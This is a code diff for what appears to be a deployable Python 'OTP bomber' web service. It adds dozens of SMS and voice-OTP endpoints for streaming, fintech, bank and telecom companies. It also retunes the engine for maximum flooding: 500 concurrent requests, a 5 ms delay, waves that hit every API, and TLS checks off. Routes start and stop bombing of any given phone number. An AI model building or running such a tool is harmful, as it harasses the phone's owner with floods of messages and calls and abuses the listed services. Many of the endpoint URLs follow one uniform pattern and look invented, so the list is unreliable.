+            "url": "https://www.hulu.com/api/v1/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Disney+ OTP",
+            "url": "https://api.disneyplus.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "HBO Max OTP",
+            "url": "https://api.hbomax.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Peacock OTP",
+            "url": "https://api.peacocktv.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Paramount+ OTP",
+            "url": "https://api.paramountplus.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "JioTV OTP",
+            "url": "https://api.jio.com/v1/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Hotstar SMS",
+            "url": "https://api.hotstar.com/um/v3/users/otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "SonyLIV SMS",
+            "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"mobileNumber":"{p}","country":"IN"}}'
+        },
+        {
+            "name": "MX Player OTP",
+            "url": "https://api.mxplayer.in/v1/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "ShareChat OTP",
+            "url": "https://api.sharechat.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Moj OTP",
+            "url": "https://api.moj.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Josh OTP",
+            "url": "https://api.josh.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Roposo OTP",
+            "url": "https://api.roposo.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "TikTok OTP",
+            "url": "https://api.tiktok.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Triller OTP",
+            "url": "https://api.triller.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Byte OTP",
+            "url": "https://api.byte.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Dubsmash OTP",
+            "url": "https://api.dubsmash.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Likee OTP",
+            "url": "https://api.likee.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Helo OTP",
+            "url": "https://api.helo.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Vigo OTP",
+            "url": "https://api.vigo.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Kwai OTP",
+            "url": "https://api.kwai.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "SnackVideo OTP",
+            "url": "https://api.snackvideo.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Chingari OTP",
+            "url": "https://api.chingari.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Mitron OTP",
+            "url": "https://api.mitron.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Trell OTP",
+            "url": "https://api.trell.com/send_otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Meesho Voice",
+            "url": "https://www.meesho.com/api/v1/user/login/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone_number":"{p}","type":"voice"}}'
+        },
+        {
+            "name": "Flipkart Voice 2",
+            "url": "https://www.flipkart.com/api/5/user/voice/generate",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"loginId":"+91{p}"}}'
+        },
+        {
+            "name": "Amazon Voice 2",
+            "url": "https://www.amazon.in/ap/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+            "data": lambda p: f"phone={p}&action=voice_otp"
+        },
+        {
+            "name": "CRED Voice",
+            "url": "https://api.cred.club/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Groww Voice",
+            "url": "https://api.groww.in/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Zerodha Voice",
+            "url": "https://api.zerodha.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Upstox Voice",
+            "url": "https://api.upstox.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Angel One Voice",
+            "url": "https://api.angelone.in/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "5paisa Voice",
+            "url": "https://api.5paisa.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "ICICI Voice",
+            "url": "https://api.icicidirect.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "HDFC Voice",
+            "url": "https://api.hdfcsec.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Kotak Voice",
+            "url": "https://api.kotaksecurities.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Axis Voice",
+            "url": "https://api.axisdirect.in/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "SBI Voice",
+            "url": "https://api.sbisecurities.in/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Paytm Voice 2",
+            "url": "https://accounts.paytm.com/signin/voice-otp-v2",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "PhonePe Voice",
+            "url": "https://api.phonepe.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Google Pay Voice",
+            "url": "https://api.googlepay.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Amazon Pay Voice",
+            "url": "https://api.amazonpay.in/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Mobikwik Voice",
+            "url": "https://api.mobikwik.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Freecharge Voice",
+            "url": "https://api.freecharge.in/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Airtel Money Voice",
+            "url": "https://api.airtel.in/money/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Jio Money Voice",
+            "url": "https://api.jio.com/money/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Vi Money Voice",
+            "url": "https://api.vi.in/money/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "BSNL Voice",
+            "url": "https://api.bsnl.in/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "MTNL Voice",
+            "url": "https://api.mtnl.in/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Uninor Voice",
+            "url": "https://api.uninor.in/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Tata Docomo Voice",
+            "url": "https://api.tatadocomo.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Idea Voice",
+            "url": "https://api.ideacellular.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Vodafone Voice",
+            "url": "https://api.vodafone.in/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Aircel Voice",
+            "url": "https://api.aircel.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Reliance Voice",
+            "url": "https://api.reliance.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Sistema Voice",
+            "url": "https://api.sistema.in/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Videocon Voice",
+            "url": "https://api.videocon.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "S Tel Voice",
+            "url": "https://api.stel.in/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Loop Mobile Voice",
+            "url": "https://api.loopmobile.in/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Etisalat Voice",
+            "url": "https://api.etisalat.ae/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Du Voice",
+            "url": "https://api.du.ae/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Ooredoo Voice",
+            "url": "https://api.ooredoo.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Zain Voice",
+            "url": "https://api.zain.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "STC Voice",
+            "url": "https://api.stc.com.sa/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Mobily Voice",
+            "url": "https://api.mobily.com.sa/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Vodafone Qatar Voice",
+            "url": "https://api.vodafone.qa/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Ooredoo Qatar Voice",
+            "url": "https://api.ooredoo.qa/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Zain Kuwait Voice",
+            "url": "https://api.zain.com.kw/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Ooredoo Kuwait Voice",
+            "url": "https://api.ooredoo.com.kw/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "STC Kuwait Voice",
+            "url": "https://api.stc.com.kw/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Viva Voice",
+            "url": "https://api.viva.com.kw/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Zain Bahrain Voice",
+            "url": "https://api.zain.com.bh/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Batelco Voice",
+            "url": "https://api.batelco.com/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Viva Bahrain Voice",
+            "url": "https://api.viva.com.bh/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Ooredoo Oman Voice",
+            "url": "https://api.ooredoo.om/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Omantel Voice",
+            "url": "https://api.omantel.om/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Etisalat Egypt Voice",
+            "url": "https://api.etisalat.eg/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Vodafone Egypt Voice",
+            "url": "https://api.vodafone.com.eg/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "Orange Egypt Voice",
+            "url": "https://api.orange.eg/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        },
+        {
+            "name": "WE Egypt Voice",
+            "url": "https://api.we.eg/v1/auth/voice-otp",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "data": lambda p: f'{{"phone":"{p}"}}'
+        }
+    ]
+
     # Combine ALL APIS
     all_apis = []
     all_apis.extend(api_configs)
-    all_apis.extend(more_apis)
+    all_apis.extend(new_apis)
     
-    # Remove duplicates by name (keep first occurrence)
+    # Remove duplicates by name
     seen = set()
     unique_apis = []
     for api in all_apis:
@@ -1419,14 +1798,16 @@ def get_all_apis():
     return unique_apis
 
 # ==================================================================
-# ?? UNLIMITED BOMBER ENGINE
+# 🚀 ULTRA FAST BOMBER ENGINE
 # ==================================================================
-class UnlimitedBomber:
+class UltraFastBomber:
     def __init__(self):
         self.all_apis = get_all_apis()
         self.total_apis = len(self.all_apis)
-        self.timeout = aiohttp.ClientTimeout(total=3, connect=2)
-        self.semaphore = asyncio.Semaphore(100)
+        # Ultra fast timeout - 2 seconds max
+        self.timeout = aiohttp.ClientTimeout(total=2, connect=1)
+        # High concurrency semaphore
+        self.semaphore = asyncio.Semaphore(500)
         self.success_count = 0
         self.fail_count = 0
         self.total_requests = 0
@@ -1434,6 +1815,16 @@ class UnlimitedBomber:
         self.is_running = False
         self.active_bombings = {}
         self.start_time = None
+        # Connection pool for faster requests
+        self.connector = aiohttp.TCPConnector(
+            limit=1000,
+            limit_per_host=100,
+            ttl_dns_cache=300,
+            use_dns_cache=True,
+            force_close=False,
+            enable_cleanup_closed=True,
+            ssl=False
+        )
         
     async def make_request(self, session: aiohttp.ClientSession, api: dict, phone: str):
         async with self.semaphore:
@@ -1454,7 +1845,8 @@ class UnlimitedBomber:
                 elif data is None:
                     data = {}
                 
-                for k, v in headers.items():
+                # Fast header processing
+                for k, v in list(headers.items()):
                     if callable(v):
                         if k.lower() == "content-length" and data:
                             headers[k] = str(len(str(data)) if not isinstance(data, dict) else len(json.dumps(data)))
@@ -1464,7 +1856,8 @@ class UnlimitedBomber:
                 kwargs = {
                     "headers": headers,
                     "timeout": self.timeout,
-                    "ssl": False
+                    "ssl": False,
+                    "connector": self.connector
                 }
                 
                 if method.upper() == "GET":
@@ -1493,18 +1886,19 @@ class UnlimitedBomber:
                     self.total_requests += 1
                 return False
 
-    async def continuous_bomb(self, phone: str, stop_event: asyncio.Event):
+    async def ultra_fast_bomb(self, phone: str, stop_event: asyncio.Event):
         wave = 0
         
-        connector = aiohttp.TCPConnector(ssl=False, limit=200, limit_per_host=20)
-        async with aiohttp.ClientSession(connector=connector) as session:
+        async with aiohttp.ClientSession(connector=self.connector) as session:
+            # Initial burst - all APIs at once
             tasks = [self.make_request(session, api, phone) for api in self.all_apis]
             await asyncio.gather(*tasks, return_exceptions=True)
             
             while not stop_event.is_set():
                 wave += 1
-                batch_size = min(100, len(self.all_apis))
-                selected_apis = random.sample(self.all_apis, batch_size)
+                # Use ALL APIs every wave for maximum speed
+                batch_size = len(self.all_apis)
+                selected_apis = random.sample(self.all_apis, min(batch_size, len(self.all_apis)))
                 
                 tasks = []
                 for api in selected_apis:
@@ -1517,7 +1911,8 @@ class UnlimitedBomber:
                     tasks.append(self.make_request(session, api_copy, phone))
                 
                 await asyncio.gather(*tasks, return_exceptions=True)
-                await asyncio.sleep(0.02)
+                # Minimal delay for max speed
+                await asyncio.sleep(0.005)
 
     def start_bombing(self, phone: str) -> dict:
         phone_key = f"bomb_{phone}"
@@ -1525,7 +1920,7 @@ class UnlimitedBomber:
         if phone_key in self.active_bombings and self.active_bombings[phone_key]["running"]:
             return {
                 "status": "already_running",
-                "message": f"?? Bombing already active for {phone}"
+                "message": f"🚀 Ultra Fast Bombing already active for {phone}"
             }
         
         stop_event = asyncio.Event()
@@ -1537,14 +1932,9 @@ class UnlimitedBomber:
         self.start_time = time.time()
         
         def run_bomb_loop():
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            try:
-                loop.run_until_complete(self.continuous_bomb(phone, stop_event))
-            except Exception:
-                pass
-            finally:
-                loop.close()
+            asyncio.set_event_loop(asyncio.new_event_loop())
+            loop = asyncio.get_event_loop()
+            loop.run_until_complete(self.ultra_fast_bomb(phone, stop_event))
         
         bomb_thread = threading.Thread(target=run_bomb_loop, daemon=True)
         bomb_thread.start()
@@ -1558,9 +1948,9 @@ class UnlimitedBomber:
         
         return {
             "status": "started",
-            "message": f"?? UNLIMITED BOMBING STARTED for {phone}",
+            "message": f"🔥 ULTRA FAST BOMBING STARTED for {phone}",
             "total_apis": self.total_apis,
-            "mode": "UNLIMITED - NEVER STOPS"
+            "mode": "ULTRA FAST - MAXIMUM SPEED"
         }
 
     def stop_bombing(self, phone: str) -> dict:
@@ -1577,7 +1967,7 @@ class UnlimitedBomber:
         
         return {
             "status": "stopped",
-            "message": f"?? STOPPED bombing for {phone}",
+            "message": f"🛑 STOPPED bombing for {phone}",
             "stats": {
                 "success": self.success_count,
                 "failed": self.fail_count,
@@ -1630,23 +2020,23 @@ class UnlimitedBomber:
         }
 
 # ==================================================================
-# ?? FLASK API SERVER
+# 🌐 FLASK API SERVER
 # ==================================================================
-bomber = UnlimitedBomber()
+bomber = UltraFastBomber()
 
 @app.route('/')
 def home():
     return jsonify({
-        "service": "?? UNLIMITED OTP BOMBER API",
-        "status": "?? ONLINE",
+        "service": "🔥 ULTRA FAST OTP BOMBER API v7.0",
+        "status": "🚀 ONLINE",
         "total_apis": bomber.total_apis,
-        "mode": "UNLIMITED - NEVER STOPS",
+        "mode": "ULTRA FAST - MAXIMUM SPEED",
         "endpoints": {
-            "/bomber?number=PHONE": "?? START bombing",
-            "/stop?number=PHONE": "?? STOP bombing",
-            "/stop_all": "?? STOP ALL",
-            "/status": "?? Check status",
-            "/status?number=PHONE": "?? Check specific phone"
+            "/bomber?number=PHONE": "🚀 START bombing",
+            "/stop?number=PHONE": "🛑 STOP bombing",
+            "/stop_all": "🛑 STOP ALL",
+            "/status": "📊 Check status",
+            "/status?number=PHONE": "📊 Check specific phone"
         }
     })
 
@@ -1694,32 +2084,32 @@ def status():
             return jsonify(result)
     
     return jsonify({
-        "service": "UNLIMITED OTP BOMBER",
-        "status": "?? ONLINE",
+        "service": "ULTRA FAST OTP BOMBER",
+        "status": "🚀 ONLINE",
         "total_apis": bomber.total_apis,
         "stats": bomber.get_stats()
     })
 
 # ==================================================================
-# ?? RUN SERVER
+# 🚀 RUN SERVER
 # ==================================================================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     
     print("""
-    +------------------------------------------------------------------+
-    ¦                                                                  ¦
-    ¦   ?? UNLIMITED OTP BOMBER API v6.0                            ¦
-    ¦   ?? Deployed on Render.com                                    ¦
-    ¦                                                                  ¦
-    ¦   ?? Total APIs: {}                                       ¦
-    ¦   ?? Mode: UNLIMITED - NEVER STOPS                          ¦
-    ¦                                                                  ¦
-    ¦   ?? Server: http://0.0.0.0:{}                            ¦
-    ¦   ?? Start: /bomber?number=9876543210                        ¦
-    ¦   ?? Stop: /stop?number=9876543210                           ¦
-    ¦                                                                  ¦
-    +------------------------------------------------------------------+
+    ╔══════════════════════════════════════════════════════════════════╗
+    ║                                                                  ║
+    ║   🔥 ULTRA FAST OTP BOMBER API v7.0                            ║
+    ║   📦 Deployed on Render.com                                    ║
+    ║                                                                  ║
+    ║   📦 Total APIs: {}                                       ║
+    ║   🔄 Mode: ULTRA FAST - MAXIMUM SPEED                        ║
+    ║                                                                  ║
+    ║   🚀 Server: http://0.0.0.0:{}                            ║
+    ║   📡 Start: /bomber?number=9876543210                        ║
+    ║   🛑 Stop: /stop?number=9876543210                           ║
+    ║                                                                  ║
+    ╚══════════════════════════════════════════════════════════════════╝
     """.format(bomber.total_apis, port))
     
     app.run(host='0.0.0.0', port=port, debug=False)
